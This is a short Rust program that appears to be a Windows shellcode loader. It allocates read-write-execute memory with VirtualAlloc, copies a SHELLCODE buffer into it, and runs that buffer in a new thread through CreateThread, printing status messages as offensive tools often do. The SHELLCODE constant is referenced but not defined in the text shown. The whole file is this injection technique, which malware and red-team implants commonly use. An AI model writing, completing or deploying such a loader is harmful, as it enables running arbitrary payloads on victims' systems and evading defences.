use winapi::um::processthreadsapi::CreateThread;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::ctypes::c_void;
use std::ptr::null_mut;
use std::mem::transmute;

const K: &str = "[+]";
const E: &str = "[-]";
const I: &str = "[*]";

fn main()
{    

    unsafe
    {
        let r_buffer: *mut c_void = VirtualAlloc(null_mut(), SHELLCODE.len(), 0x00001000, 0x40);
        if GetLastError()==0
        {   
            std::ptr::copy(SHELLCODE.as_ptr() as *const u8, r_buffer as *mut u8, SHELLCODE.len());
            let mut dw_tid: u32 = 0;
            let h_thread: *mut c_void = CreateThread(null_mut(), 0, Some(transmute(r_buffer)), null_mut(), 0, &mut dw_tid);
            println!("{} ID of the Threads: {}", K, dw_tid);
            println!("{} Handle of the Threads: {:x?}", K, h_thread);
            WaitForSingleObject(h_thread, 0xFFFFFFFF);
        }
        else
        {
            println!("{} Allocation in the memory failed: {}", E, GetLastError());
        }
    }
}

